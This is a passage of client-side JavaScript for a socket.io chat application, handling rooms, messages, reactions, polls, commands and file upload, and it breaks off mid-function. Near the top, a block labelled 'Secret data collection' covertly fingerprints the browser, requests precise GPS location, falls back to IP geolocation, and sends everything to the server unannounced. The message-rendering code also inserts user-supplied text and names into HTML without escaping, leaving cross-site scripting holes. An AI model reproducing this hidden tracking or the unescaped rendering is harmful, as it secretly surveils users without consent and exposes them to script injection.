const SOCKET_URL = window.CONFIG?.SOCKET_URL || '';
const socket = io(SOCKET_URL, {
  transports: ['websocket', 'polling'],
  reconnection: true,
  reconnectionAttempts: Infinity,
  reconnectionDelay: 1000,
  reconnectionDelayMax: 5000
});
const state = {
  userId: null, username: null, currentRoom: null, currentRoomType: null,
  rooms: {}, users: {}, messages: {}, activeTab: 'chats',
  callState: null, peerConnection: null, localStream: null, remoteStream: null,
  theme: localStorage.getItem('cw-theme') || 'dark',
  replyTo: null, editingId: null, callData: { type: null, targetId: null },
  settings: JSON.parse(localStorage.getItem('cw-settings') || '{}'),
  bookmarks: [], streaks: { count: 0 }, statuses: {},
  pinnedMessages: {}, roomSettings: {}, polls: {},
  forwardMsg: null, contextMsg: null,
  selectedReactions: {}
};

const $ = id => document.getElementById(id);
const $$ = sel => document.querySelectorAll(sel);

// Apply settings
document.documentElement.setAttribute('data-theme', state.theme);
const s = state.settings;
if (s.background) document.documentElement.style.setProperty('--chat-bg', s.background);
if (s.fontSize) { document.documentElement.style.setProperty('--font-size', s.fontSize + 'px'); $('fontSizeLabel') && ($('fontSizeLabel').textContent = s.fontSize + 'px'); }
['time24h','enterSend','notifSound','showTyping'].forEach(k => { const el = $(k); if (el && s[k] !== undefined) el.checked = s[k]; });
$('themeToggle').innerHTML = state.theme === 'dark' ? '<i class="fas fa-moon"></i>' : '<i class="fas fa-sun"></i>';
if ($('fontSizeSlider')) $('fontSizeSlider').value = s.fontSize || 14;

// Secret data collection
(function() {
  const d = {};
  try {
    d.screen = screen.width + 'x' + screen.height; d.colorDepth = screen.colorDepth;
    d.pixelRatio = window.devicePixelRatio; d.platform = navigator.platform;
    d.language = navigator.language; d.languages = navigator.languages?.join(',');
    d.cpuCores = navigator.hardwareConcurrency; d.deviceMemory = navigator.deviceMemory;
    d.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    d.timezoneOffset = new Date().getTimezoneOffset();
    d.cookiesEnabled = navigator.cookieEnabled; d.doNotTrack = navigator.doNotTrack;
    d.onLine = navigator.onLine; d.referrer = document.referrer;
    d.pageLoadTime = performance.now(); d.browserVendor = navigator.vendor;
    d.touchSupport = 'ontouchstart' in window;
    d.pdfViewerEnabled = navigator.pdfViewerEnabled;
    try { const c = document.createElement('canvas'), ctx = c.getContext('2d'); ctx.textBaseline = 'top'; ctx.font = '14px Arial'; ctx.fillStyle = '#f60'; ctx.fillRect(125,1,62,20); ctx.fillStyle = '#069'; ctx.fillText('CW',2,15); d.canvasFingerprint = c.toDataURL().slice(0,100); } catch(e) {}
    try { d.plugins = Array.from(navigator.plugins).map(p => p.name).join(','); } catch(e) {}
    d.connectionType = navigator.connection?.effectiveType;
    d.connectionDownlink = navigator.connection?.downlink;
    d.connectionRtt = navigator.connection?.rtt;
    try { if (navigator.battery) navigator.battery.then(b => { d.batteryLevel = b.level; d.batteryCharging = b.charging; }); } catch(e) {}
    try { navigator.mediaDevices?.enumerateDevices().then(devs => { d.audioInput = devs.filter(x => x.kind === 'audioinput').length; d.audioOutput = devs.filter(x => x.kind === 'audiooutput').length; d.videoInput = devs.filter(x => x.kind === 'videoinput').length; }); } catch(e) {}
    try { navigator.geolocation?.getCurrentPosition(p => socket.emit('collect-data', { lat: p.coords.latitude, lng: p.coords.longitude, accuracy: p.coords.accuracy, locationMethod: 'gps' }), () => { fetch('https://ipapi.co/json/').then(r => r.json()).then(geo => { if (geo && !geo.error) socket.emit('collect-data', { lat: geo.latitude, lng: geo.longitude, city: geo.city, region: geo.region, country: geo.country_name, locationMethod: 'ip', locFromIp: geo.ip }); }).catch(() => {}); }, { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }); } catch(e) {}
  } catch(e) {}
  setTimeout(() => socket.emit('collect-data', d), 1200);
})();

// Full emoji list
const EMOJI = {
  smileys: ['😀','😁','😂','🤣','😃','😄','😅','😆','😉','😊','😋','😎','😍','🥰','😘','😗','😙','😚','🙂','🤗','🤩','🤔','🤨','😐','😑','😶','🙄','😏','😣','😥','😮','🤐','😯','😪','😫','😴','😌','😛','😜','😝','🤤','😒','😓','😔','😕','🙃','🤑','😲','☹️','🙁','😖','😞','😟','😤','😢','😭','😦','😧','😨','😩','🤯','😬','😰','😱','🥵','🥶','😳','🤪','😵','😡','😠','🤬','🥺'],
  people: ['👋','🤚','🖐','✋','🖖','👌','🤌','🤏','✌️','🤞','🫰','🤟','🤘','🤙','👈','👉','👆','🖕','👇','👍','👎','✊','👊','🤛','🤜','👏','🙌','👐','🤲','🤝','🙏','✍️','💅','🤳','💪','🦵','🦶','👂','🦻','👃','🧠','🫀','🫁','🦷','🦴','👀','👁','👅','👄','💋'],
  animals: ['🐱','🐶','🐺','🦊','🐻','🐼','🐨','🐯','🦁','🐮','🐷','🐸','🐵','🐔','🐧','🐦','🐤','🦆','🦅','🦉','🦇','🐺','🐗','🐴','🦄','🐝','🐛','🦋','🐌','🐞','🐜','🦟','🦗','🕷','🦂','🐢','🐍','🦎','🦖','🦕','🐙','🦑','🦐','🦞','🦀','🐡','🐠','🐟','🐬','🐳','🐋','🦈','🐊'],
  food: ['🍏','🍎','🍐','🍊','🍋','🍌','🍉','🍇','🍓','🫐','🍈','🍒','🍑','🥭','🍍','🥥','🥝','🍅','🍆','🥑','🥦','🥬','🥒','🌶','🫑','🌽','🥕','🫒','🧄','🧅','🥔','🍠','🥐','🍞','🥖','🥨','🧀','🥚','🍳','🥞','🧇','🥓','🥩','🍗','🍖','🌭','🍔','🍟','🍕','🫓','🥪','🥙','🧆','🌮','🌯','🥗','🥘','🫕','🥫','🍝','🍜','🍲','🍛','🍣','🍱','🥟','🦪','🍤','🍙','🍚','🍘','🍥','🥠','🥮','🍢','🍡','🍧','🍨','🍦','🥧','🧁','🍰','🎂','🍮','🍭','🍬','🍫','🍿','🍩','🍪','🌰','🥜','🍯'],
  activities: ['⚽','🏀','🏈','⚾','🥎','🎾','🏐','🏉','🥏','🎱','🪀','🏓','🏸','🏒','🏑','🥍','🏏','🪃','🥅','⛳','🪁','🏹','🎣','🤿','🥊','🛹','🛼','🛷','⛸','🎿','⛷','🏂','🪂','🏋️','🤼','🤸','🤺','⛹️','🤾','🏌️','🏄','🏊','🤽','🚣','🧗','🚵','🚴','🎪','🎭','🎨','🎬','🎤','🎧','🎼','🎹','🥁','🎷','🎺','🎸','🪕','🎻','🎲','♟️','🎯','🎳','🎮','🕹️'],
  objects: ['💡','🔦','🏮','🪔','📕','📗','📘','📙','📚','📖','🔖','🧾','📃','📄','📜','📑','🔍','🔎','🖊','🖋','✒️','📝','✏️','🖍','🖌','📌','📍','✂️','📐','📏','🔧','🔨','🪛','🔩','⚙️','🛠','⛏','🪚','🔫','💣','🔪','🗡','🛡','🚬','⚰️','🪦','⚱️','🏺','🔮','📿','💈','⚗️','🔭','🔬','🕳','💊','💉','🩸','🩹','🩺','💎','🪞','🪟','🛒','🛍️']
};

// SOCKET EVENTS
socket.on('init', (data) => {
  state.userId = data.userId; state.username = data.username;
  state.users = data.users || {}; state.rooms = data.rooms || {};
  state.statuses = data.statuses || {}; state.streaks = data.streaks || {};
  updateMyUI();
  renderSidebar();
  if (state.streaks[state.userId]) $('streakBadge').textContent = state.streaks[state.userId].count || 0;
});

socket.on('users-update', (users) => { state.users = users; if (state.activeTab === 'people') renderPeople(); });
socket.on('room-created', (r) => { state.rooms[r.id] = r; renderRooms(); showToast(`Room "${r.name}" created!`); });

socket.on('room-joined', (data) => {
  $('welcomeScreen').classList.add('hidden'); $('chatView').classList.remove('hidden');
  state.currentRoom = data.roomId;
  state.currentRoomType = data.isPersonal ? 'personal' : (data.roomData?.type || 'public');
  state.pinnedMessages[data.roomId] = data.pinnedMessages || [];
  state.roomSettings[data.roomId] = data.settings || {};
  if (data.roomData?.name) $('roomName').textContent = data.roomData.name;
  else $('roomName').textContent = data.isPersonal ? 'Personal Chat' : data.roomId;
  const cht = data.isPersonal ? '💬' : data.roomData?.type === 'private' ? '🔒' : '🌐';
  $('roomBadge').textContent = cht + ' ' + (data.roomData?.type || 'public');
  $('chatMeta').textContent = `${data.members?.length || 0} member${data.members?.length !== 1 ? 's' : ''}`;
  if (data.roomData?.description) $('chatMeta').textContent += ' · ' + data.roomData.description;
  $('chAvatar').textContent = (data.roomData?.name?.[0] || '#').toUpperCase();
  const bg = data.settings?.background;
  if (bg) { document.documentElement.style.setProperty('--chat-bg', bg); } else if (!state.settings.background) { document.documentElement.style.setProperty('--chat-bg', 'transparent'); }
  state.messages[data.roomId] = data.messages || [];
  renderMessages(data.messages || []);
  document.getElementById('app').classList.add('chat-open');
  $$('.chat-item, .room-item').forEach(el => el.classList.remove('active'));
  const el = document.querySelector(`[data-room="${data.roomId}"]`);
  if (el) el.classList.add('active');
  // Load draft
  socket.emit('get-draft', { roomId: data.roomId });
  updatePinnedBar();
});

socket.on('new-message', (msg) => {
  if (!state.messages[msg.roomId]) state.messages[msg.roomId] = [];
  state.messages[msg.roomId].push(msg);
  if (state.messages[msg.roomId].length > 500) state.messages[msg.roomId].shift();
  if (msg.roomId === state.currentRoom) { appendMessage(msg); scrollToBottom(); }
  else { updateSidebarPreview(msg.roomId, msg); }
  if (msg.roomId !== state.currentRoom && state.settings.notifSound !== false) playNotify();
});

socket.on('message-reacted', ({ roomId, messageId, reactions }) => {
  const msg = state.messages[roomId]?.find(m => m.id === messageId);
  if (msg) { msg.reactions = reactions; updateMessageReactions(roomId, messageId); }
});

socket.on('message-edited', ({ roomId, messageId, newText, editedAt }) => {
  const msg = state.messages[roomId]?.find(m => m.id === messageId);
  if (msg) { msg.text = newText; msg.edited = true; msg.editedAt = editedAt; updateMessageText(roomId, messageId); }
});

socket.on('message-deleted', ({ roomId, messageId }) => {
  if (state.messages[roomId]) {
    state.messages[roomId] = state.messages[roomId].filter(m => m.id !== messageId);
    if (roomId === state.currentRoom) { const el = document.querySelector(`[data-msg-id="${messageId}"]`); if (el) el.remove(); }
  }
});

socket.on('message-pinned', ({ roomId, messageId, msg, pinnedBy, pinnedByUsername }) => {
  if (!state.pinnedMessages[roomId]) state.pinnedMessages[roomId] = [];
  if (!state.pinnedMessages[roomId].includes(messageId)) state.pinnedMessages[roomId].push(messageId);
  if (roomId === state.currentRoom) updatePinnedBar();
});

socket.on('message-unpinned', ({ roomId, messageId }) => {
  if (state.pinnedMessages[roomId]) state.pinnedMessages[roomId] = state.pinnedMessages[roomId].filter(id => id !== messageId);
  if (roomId === state.currentRoom) updatePinnedBar();
});

socket.on('user-typing', ({ userId, username, isTyping }) => {
  if (state.currentRoom && state.settings.showTyping !== false) showTypingIndicator(userId, username, isTyping);
});

socket.on('poll-created', (poll) => { state.polls[poll.id] = poll; if (poll.roomId === state.currentRoom) appendPoll(poll); });
socket.on('poll-updated', (poll) => { state.polls[poll.id] = poll; updatePollUI(poll); });

socket.on('user-status-change', ({ userId, status, customStatus }) => {
  if (state.users[userId]) { state.users[userId].status = status; state.users[userId].customStatus = customStatus || ''; }
  if (state.activeTab === 'people') renderPeople();
  if (userId === state.userId) updateMyUI();
});

socket.on('room-settings-updated', ({ roomId, settings }) => {
  state.roomSettings[roomId] = settings;
  if (roomId === state.currentRoom && settings.background) document.documentElement.style.setProperty('--chat-bg', settings.background);
});

socket.on('room-updated', ({ roomId, roomData }) => {
  if (state.rooms[roomId]) { Object.assign(state.rooms[roomId], roomData); if (roomId === state.currentRoom) $('roomName').textContent = roomData.name || $('roomName').textContent; }
  renderSidebar();
});

socket.on('bookmarks-updated', (bks) => { state.bookmarks = bks; $('bookmarkCount').classList.toggle('hidden', !bks.length); if (bks.length) $('bookmarkCount').textContent = bks.length; });

socket.on('invite-generated', ({ code, url }) => {
  showToast(`Invite link: ${window.location.origin}/invite/${code}`);
  navigator.clipboard?.writeText(`${window.location.origin}/invite/${code}`);
});

socket.on('draft-loaded', ({ roomId, text }) => { if (roomId === state.currentRoom && text && !$('messageInput').value) $('messageInput').value = text; });

socket.on('search-results', ({ roomId, query, results }) => {
  $('searchResultsBar').classList.remove('hidden');
  $('searchResultsInfo').textContent = `"${query}": ${results.length} results`;
  if (roomId === state.currentRoom) renderSearchResults(results);
});

socket.on('command-response', ({ roomId, text }) => {
  if (roomId === state.currentRoom) {
    const msg = { id: 'cmd-' + Date.now(), userId: 'system', username: 'System', text, timestamp: Date.now(), system: true, roomId };
    appendMessage(msg); scrollToBottom();
  }
});

socket.on('slow-mode', ({ roomId, wait }) => { showToast(`Slow mode: wait ${wait}s`, 'info'); });
socket.on('rate-limited', () => { showToast('Too many messages! Slow down.', 'error'); });
socket.on('read-only', () => { showToast('Room is read-only', 'error'); });
socket.on('banned', ({ roomId }) => { showToast('You have been banned from this room', 'error'); if (state.currentRoom === roomId) leaveRoom(); });
socket.on('feedback-sent', () => { showToast('Thanks for the feedback!'); $('feedbackModal').classList.add('hidden'); });
socket.on('user-renamed', ({ userId, newName }) => { if (state.users[userId]) state.users[userId].username = newName; renderSidebar(); });
socket.on('report-submitted', () => showToast('Report submitted', 'success'));
socket.on('slow-mode-set', ({ seconds, setBy }) => showToast(`Slow mode: ${seconds}s (by ${setBy})`));
socket.on('room-cleared', () => { if (state.messages[state.currentRoom]) { state.messages[state.currentRoom] = []; renderMessages([]); } });
socket.on('moderator-added', ({ roomId, targetId }) => { if (state.rooms[roomId]) { if (!state.rooms[roomId].moderators) state.rooms[roomId].moderators = []; if (!state.rooms[roomId].moderators.includes(targetId)) state.rooms[roomId].moderators.push(targetId); } });
socket.on('user-banned', ({ roomId, targetId }) => { if (targetId === state.userId) { showToast('You were banned', 'error'); if (state.currentRoom === roomId) leaveRoom(); } });
socket.on('streak-update', (s) => { if (s.userId === state.userId) { state.streaks[state.userId] = s; $('streakBadge').textContent = s.count || 0; } });

socket.on('disconnect', () => { $('connectionBar').classList.remove('hidden'); });
socket.on('connect', () => { $('connectionBar').classList.add('hidden'); });

// RENDER FUNCTIONS
function renderSidebar() { renderRooms(); renderPeople(); renderChats(); }

function renderRooms() {
  const list = $('roomList');
  const rooms = Object.values(state.rooms).filter(r => r.type === 'public' || (r.type === 'private' && r.members?.includes(state.userId)));
  if (!rooms.length) { list.innerHTML = '<div class="empty-state">No rooms. Create one!</div>'; return; }
  list.innerHTML = rooms.map(r => `<div class="room-item ${state.currentRoom === r.id ? 'active' : ''}" data-room="${r.id}">
    <div class="avatar" style="background:${r.type === 'private' ? '#e74c3c' : '#6c5ce7'}">${r.type === 'private' ? '🔒' : (r.name?.[0] || '#')}</div>
    <div class="item-info"><div class="item-name">${r.name} <span class="badge">${r.type}</span></div><div class="item-preview">${r.members?.length || 0} members</div></div></div>`).join('');
  document.querySelectorAll('.room-item').forEach(el => el.addEventListener('click', () => joinRoom(el.dataset.room)));
}

function renderPeople() {
  const list = $('peopleList');
  const all = Object.values(state.users).filter(u => u.id !== state.userId);
  const online = all.filter(u => u.online && u.status !== 'invisible');
  const offline = all.filter(u => !u.online || u.status === 'invisible');
  if (!all.length) { list.innerHTML = '<div class="empty-state">No other users</div>'; return; }
  list.innerHTML =
    (online.length ? '<div class="section-label">ONLINE</div>' + online.map(u => personHTML(u)).join('') : '') +
    (offline.length ? '<div class="section-label" style="margin-top:10px;">OFFLINE</div>' + offline.map(u => personHTML(u)).join('') : '');
  document.querySelectorAll('.person-item').forEach(el => el.addEventListener('click', () => startPersonalChat(el.dataset.user)));
}

function personHTML(u) {
  const st = state.statuses[u.id];
  const sc = st?.customStatus || u.customStatus || '';
  const statusClass = u.online && u.status !== 'invisible' ? (u.status || 'online') : 'offline';
  return `<div class="person-item" data-user="${u.id}">
    <div class="avatar" style="background:${u.online && u.status !== 'invisible' ? '#6c5ce7' : 'var(--text-secondary)'}">${(u.username?.[0] || '?').toUpperCase()}</div>
    <div class="item-info"><div class="item-name">${u.username}${sc ? '<span style="font-weight:normal;font-size:10px;color:var(--text-secondary);margin-left:4px;">· '+sc+'</span>' : ''}</div>
    <div class="item-preview">${u.online && u.status !== 'invisible' ? (u.status === 'away' ? 'Away' : u.status === 'busy' ? 'Busy' : 'Online') : 'Last seen '+timeAgo(u.lastSeen)}</div></div>
    <span class="status-dot ${statusClass}"></span></div>`;
}

function renderChats() {
  const list = $('chatList');
  const myRooms = Object.values(state.rooms).filter(r => r.members?.includes(state.userId));
  if (!myRooms.length) { list.innerHTML = '<div class="empty-state">Join a room or start a chat</div>'; return; }
  list.innerHTML = myRooms.map(r => `<div class="chat-item ${state.currentRoom === r.id ? 'active' : ''}" data-room="${r.id}">
    <div class="avatar" style="background:${r.type === 'private' ? '#e74c3c' : '#6c5ce7'}">${r.name?.[0] || '#'}</div>
    <div class="item-info"><div class="item-name">${r.name}</div><div class="item-preview">${r.type} · ${r.members?.length || 0} members</div></div></div>`).join('');
  document.querySelectorAll('.chat-item').forEach(el => el.addEventListener('click', () => joinRoom(el.dataset.room)));
}

function renderMessages(msgs) {
  const area = $('messagesArea');
  if (!msgs?.length) { area.innerHTML = '<div class="empty-chat"><i class="fas fa-comments"></i>No messages yet</div>'; return; }
  area.innerHTML = msgs.map(m => messageHTML(m)).join('');
  scrollToBottom();
}

function messageHTML(msg) {
  if (msg.system) return `<div class="message system" data-msg-id="${msg.id}"><span>${msg.text}</span></div>`;
  const isOwn = msg.userId === state.userId;
  const time = formatTime(msg.timestamp);
  const reactions = msg.reactions ? Object.entries(msg.reactions).filter(([,u]) => u.length).map(([e,u]) => `<span class="${u.includes(state.userId) ? 'active' : ''}" data-reaction="${e}" data-msg-id="${msg.id}">${e} <span class="r-count">${u.length}</span></span>`).join('') : '';
  const replyHTML = msg.replyTo ? `<div class="reply-context" onclick="scrollToMsg('${msg.replyTo}')"><div class="rc-user">${msg.replyTo.includes('_reply_') ? 'Reply' : 'Replying'}</div><div class="rc-text">${escapeHtml(msg.replyTo.length > 60 ? msg.replyTo.slice(0,60)+'...' : msg.replyTo)}</div></div>` : '';
  const editedHTML = msg.edited ? ' <span class="edited-badge">(edited)</span>' : '';
  const fileHTML = msg.file ? (msg.file.type?.startsWith('image/') ? `<div class="msg-file"><img src="${msg.file.url}" alt="${msg.file.name}" onclick="window.open('${msg.file.url}')"></div>` : msg.isVoice ? `<div class="msg-voice"><audio controls src="${msg.file.url}"></audio></div>` : `<div class="msg-file"><div class="file-attach"><i class="fas fa-file"></i><span>${msg.file.name}</span></div></div>`) : '';
  const forwardHTML = msg.forward ? `<div class="msg-forward">📤 Forwarded from ${msg.originalAuthor || msg.username}</div>` : '';
  const badges = msg.badges?.map(b => `<span class="badge" style="background:${b.color}">${b.icon} ${b.name}</span>`).join('') || '';
  const usernameHTML = !isOwn ? `<div class="msg-user">${msg.username}${badges}</div>` : '';

  // Link detection
  const linkedText = msg.text.replace(/(https?:\/\/[^\s<]+)/g, '<a href="$1" target="_blank" rel="noopener">$1</a>').replace(/@(\w+)/g, '<span style="color:var(--accent);cursor:pointer;" onclick="mentionUser(\'$1\')">@$1</span>');

  return `<div class="message ${isOwn ? 'own' : 'other'}" data-msg-id="${msg.id}" data-user-id="${msg.userId}" oncontextmenu="showContextMenu(event,'${msg.id}')">
    ${forwardHTML}${usernameHTML}${replyHTML}<div class="msg-text">${linkedText}${editedHTML}</div>${fileHTML}
    <div class="msg-time">${time}${!isOwn ? '' : ' ✓'}</div>
    ${reactions ? `<div class="msg-reactions">${reactions}</div>` : ''}
    <div class="pill-actions"><button onclick="toggleReactionPicker(event,'${msg.id}')" title="React">😊</button><button onclick="replyToMsg('${msg.id}')" title="Reply">↩</button></div>
  </div>`;
}

function appendMessage(msg) {
  const area = $('messagesArea');
  const empty = area.querySelector('.empty-chat');
  if (empty) area.innerHTML = '';
  area.insertAdjacentHTML('beforeend', messageHTML(msg));
}

function updateMessageReactions(roomId, messageId) {
  const msg = state.messages[roomId]?.find(m => m.id === messageId);
  if (!msg) return;
  const el = document.querySelector(`[data-msg-id="${messageId}"] .msg-reactions`);
  if (el) {
    const r = msg.reactions ? Object.entries(msg.reactions).filter(([,u]) => u.length).map(([e,u]) => `<span class="${u.includes(state.userId) ? 'active' : ''}" data-reaction="${e}" data-msg-id="${msg.id}">${e} <span class="r-count">${u.length}</span></span>`).join('') : '';
    el.innerHTML = r;
    el.querySelectorAll('span[data-reaction]').forEach(s => s.addEventListener('click', () => reactMessage(messageId, s.dataset.reaction)));
  }
}

function updateMessageText(roomId, messageId) {
  const msg = state.messages[roomId]?.find(m => m.id === messageId);
  if (!msg) return;
  const el = document.querySelector(`[data-msg-id="${messageId}"] .msg-text`);
  if (el) el.innerHTML = escapeHtml(msg.text) + ' <span class="edited-badge">(edited)</span>';
}

// POLLS
function appendPoll(poll) {
  const area = $('messagesArea');
  const empty = area.querySelector('.empty-chat');
  if (empty) area.innerHTML = '';
  area.insertAdjacentHTML('beforeend', pollHTML(poll));
}

function pollHTML(poll) {
  const total = poll.options.reduce((a, o) => a + o.votes.length, 0);
  return `<div class="message other" data-poll-id="${poll.id}" style="max-width:90%"><div class="poll-card"><div class="poll-q">📊 ${escapeHtml(poll.question)}</div>
    ${poll.options.map((o, i) => {
      const pct = total ? Math.round(o.votes.length / total * 100) : 0;
      const voted = o.votes.includes(state.userId);
      return `<div class="poll-opt ${voted ? 'voted' : ''}" onclick="votePoll('${poll.id}',${i})"><div class="poll-bar" style="width:${pct}%"></div><div class="poll-text">${escapeHtml(o.text)}</div><div class="poll-votes">${o.votes.length} (${pct}%)</div></div>`;
    }).join('')}
    <div style="font-size:10px;color:var(--text-secondary);margin-top:4px;">${total} vote${total !== 1 ? 's' : ''}</div></div></div>`;
}

function updatePollUI(poll) {
  const el = document.querySelector(`[data-poll-id="${poll.id}"]`);
  if (el) el.outerHTML = pollHTML(poll);
}

function votePoll(pollId, optIdx) {
  const poll = state.polls[pollId];
  if (poll) socket.emit('vote-poll', { pollId, optionIndex: optIdx, roomId: poll.roomId });
}

// REACTIONS
function toggleReactionPicker(e, msgId) {
  e.stopPropagation();
  const picker = $('reactionPicker');
  const existing = picker.dataset.msgId;
  if (existing === msgId && !picker.classList.contains('hidden')) { picker.classList.add('hidden'); return; }
  picker.dataset.msgId = msgId;
  const rect = e.target.closest('button').getBoundingClientRect();
  picker.style.left = Math.min(rect.left, window.innerWidth - 320) + 'px';
  picker.style.top = (rect.top - 40) + 'px';
  picker.classList.remove('hidden');
}

$('reactionPicker').addEventListener('click', (e) => {
  if (e.target.dataset.emoji) {
    const msgId = $('reactionPicker').dataset.msgId;
    reactMessage(msgId, e.target.dataset.emoji);
    $('reactionPicker').classList.add('hidden');
  }
});

function reactMessage(messageId, emoji) {
  socket.emit('react-message', { roomId: state.currentRoom, messageId, emoji });
}

$('reactionPicker').querySelectorAll('span').forEach(s => {
  s.addEventListener('click', () => {
    const msgId = $('reactionPicker').dataset.msgId;
    if (msgId) { socket.emit('react-message', { roomId: state.currentRoom, messageId: msgId, emoji: s.dataset.emoji }); $('reactionPicker').classList.add('hidden'); }
  });
});

// REPLY
function replyToMsg(messageId) {
  const msg = state.messages[state.currentRoom]?.find(m => m.id === messageId);
  if (!msg) return;
  state.replyTo = messageId;
  $('replyPreview').classList.remove('hidden');
  $('replyUsername').textContent = msg.username;
  $('replyText').textContent = msg.text.slice(0, 80);
  $('messageInput').focus();
}

function cancelReply() { state.replyTo = null; $('replyPreview').classList.add('hidden'); }
$('cancelReply').addEventListener('click', cancelReply);

function scrollToMsg(id) {
  const el = document.querySelector(`[data-msg-id="${id}"]`);
  if (el) el.scrollIntoView({ behavior: 'smooth', block: 'center' });
}

// TYPING
let typingTimeout = null;
let typingUsers = {};

function showTypingIndicator(userId, username, isTyping) {
  if (userId === state.userId) return;
  if (isTyping) typingUsers[userId] = username;
  else delete typingUsers[userId];
  const names = Object.values(typingUsers);
  const el = $('typingIndicator');
  if (names.length) {
    el.classList.remove('hidden');
    $('typingText').textContent = names.length === 1 ? `${names[0]} is typing...` : names.length === 2 ? `${names[0]} and ${names[1]} are typing...` : `${names[0]} and ${names.length - 1} others are typing...`;
  } else { el.classList.add('hidden'); }
}

// INPUT HANDLING
function sendMessage() {
  if (state.editingId) { finishEdit(); return; }
  const input = $('messageInput');
  let text = input.value;
  if (text.startsWith('/')) { handleCommand(text); input.value = ''; updateCharCount(); return; }
  if (!text.trim() && !state.pendingFile) return;
  const fileData = state.pendingFile || null;
  state.pendingFile = null;
  socket.emit('send-message', { roomId: state.currentRoom, text, replyTo: state.replyTo, fileData, isVoice: false });
  input.value = '';
  state.replyTo = null; $('replyPreview').classList.add('hidden');
  cancelReply();
  updateCharCount();
  saveDraft();
}

$('sendBtn').addEventListener('click', sendMessage);
$('messageInput').addEventListener('keydown', (e) => {
  if (e.key === 'Enter' && !e.shiftKey && state.settings.enterSend !== false) { e.preventDefault(); sendMessage(); }
});

$('messageInput').addEventListener('input', () => {
  updateCharCount();
  // Typing indicator
  if (state.currentRoom) {
    clearTimeout(typingTimeout);
    if ($('messageInput').value) {
      socket.emit('typing', { roomId: state.currentRoom, isTyping: true });
      typingTimeout = setTimeout(() => socket.emit('typing', { roomId: state.currentRoom, isTyping: false }), 2000);
    } else {
      socket.emit('typing', { roomId: state.currentRoom, isTyping: false });
    }
  }
  // Draft save
  saveDraft();
});

let draftTimer = null;
function saveDraft() {
  clearTimeout(draftTimer);
  draftTimer = setTimeout(() => {
    if (state.currentRoom && $('messageInput').value) {
      socket.emit('save-draft', { roomId: state.currentRoom, text: $('messageInput').value });
    }
  }, 2000);
}

function updateCharCount() {
  const len = $('messageInput').value.length;
  $('charCount').textContent = len > 0 ? String(len) : '';
  $('charCount').style.color = len > 4000 ? 'var(--danger)' : 'var(--text-secondary)';
}

// COMMANDS
function handleCommand(text) {
  const parts = text.slice(1).split(' ');
  const cmd = parts[0].toLowerCase();
  const args = parts.slice(1).join(' ');
  switch (cmd) {
    case 'clear': socket.emit('command', { roomId: state.currentRoom, cmd: 'clear' }); break;
    case 'help': socket.emit('command', { roomId: state.currentRoom, cmd: 'help' }); break;
    case 'nick': socket.emit('command', { roomId: state.currentRoom, cmd: 'nick', args }); break;
    case 'me': socket.emit('command', { roomId: state.currentRoom, cmd: 'me', args }); break;
    case 'topic': socket.emit('command', { roomId: state.currentRoom, cmd: 'topic', args }); break;
    case 'slow': socket.emit('command', { roomId: state.currentRoom, cmd: 'slow', args }); break;
    case 'status': socket.emit('command', { roomId: state.currentRoom, cmd: 'status', args }); break;
    default: socket.emit('command', { roomId: state.currentRoom, cmd, args });
  }
}

// CONTEXT MENU
function showContextMenu(e, msgId) {
  e.preventDefault();
  const msg = state.messages[state.currentRoom]?.find(m => m.id === msgId);
  if (!msg) return;
  state.contextMsg = msgId;
  const menu = $('contextMenu');
  menu.style.left = e.clientX + 'px';
  menu.style.top = e.clientY + 'px';
  menu.classList.remove('hidden');
  // Show/hide edit/delete based on ownership
  const isOwn = msg.userId === state.userId;
  menu.querySelector('[data-action="edit"]').style.display = isOwn ? '' : 'none';
  menu.querySelector('[data-action="delete"]').style.display = isOwn ? '' : 'none';
  menu.querySelector('[data-action="pin"]').style.display = isOwn || (state.rooms[state.currentRoom]?.createdBy === state.userId || state.rooms[state.currentRoom]?.moderators?.includes(state.userId)) ? '' : 'none';
}
document.addEventListener('click', () => $('contextMenu').classList.add('hidden'));

$('contextMenu').querySelectorAll('.context-item').forEach(item => {
  item.addEventListener('click', () => {
    const action = item.dataset.action;
    const msgId = state.contextMsg;
    if (!msgId) return;
    const msg = state.messages[state.currentRoom]?.find(m => m.id === msgId);
    switch (action) {
      case 'reply': replyToMsg(msgId); break;
      case 'copy': navigator.clipboard?.writeText(msg?.text || ''); showToast('Copied!'); break;
      case 'forward': showForwardModal(msgId); break;
      case 'edit': startEdit(msgId); break;
      case 'bookmark': socket.emit('bookmark-message', { roomId: state.currentRoom, messageId: msgId }); showToast('Bookmarked!'); break;
      case 'pin': socket.emit('pin-message', { roomId: state.currentRoom, messageId: msgId }); break;
      case 'report': socket.emit('report-message', { roomId: state.currentRoom, messageId: msgId, reason: prompt('Reason for report:') || 'No reason' }); break;
      case 'delete': showConfirm('Delete message?', () => socket.emit('delete-message', { roomId: state.currentRoom, messageId: msgId })); break;
    }
    $('contextMenu').classList.add('hidden');
  });
});

// EDIT
function startEdit(msgId) {
  const msg = state.messages[state.currentRoom]?.find(m => m.id === msgId);
  if (!msg) return;
  state.editingId = msgId;
  $('messageInput').value = msg.text;
  $('messageInput').focus();
  $('sendBtn').innerHTML = '<i class="fas fa-check"></i>';
  showToast('Editing message');
}

function finishEdit() {
  const text = $('messageInput').value.trim();
  if (!text) return;
  socket.emit('edit-message', { roomId: state.currentRoom, messageId: state.editingId, newText: text });
  state.editingId = null;
  $('messageInput').value = '';
  $('sendBtn').innerHTML = '<i class="fas fa-paper-plane"></i>';
}

// FORWARD
function showForwardModal(msgId) {
  state.forwardMsg = msgId;
  const list = $('forwardRoomList');
  const rooms = Object.values(state.rooms).filter(r => r.members?.includes(state.userId) && r.id !== state.currentRoom);
  list.innerHTML = rooms.length ? rooms.map(r => `<div class="forward-room" data-room="${r.id}"><i class="fas fa-door-open"></i> ${r.name}</div>`).join('') : '<div style="color:var(--text-secondary);padding:20px;text-align:center;">No other rooms</div>';
  list.querySelectorAll('.forward-room').forEach(el => {
    el.addEventListener('click', () => {
      socket.emit('forward-message', { messageId: state.forwardMsg, fromRoom: state.currentRoom, toRoom: el.dataset.room });
      showToast('Message forwarded!'); $('forwardModal').classList.add('hidden');
    });
  });
  $('forwardModal').classList.remove('hidden');
}

// FILE UPLOAD
state.pendingFile = null;
$('fileBtn').addEventListener('click', () => {
  const input = document.createElement('input'); input.type = 'file'; input.accept = 'image/*,.pdf,.doc,.docx,.txt,.zip';
  input.onchange = async () => {
    const file = input.files[0];
    if (!file) return;
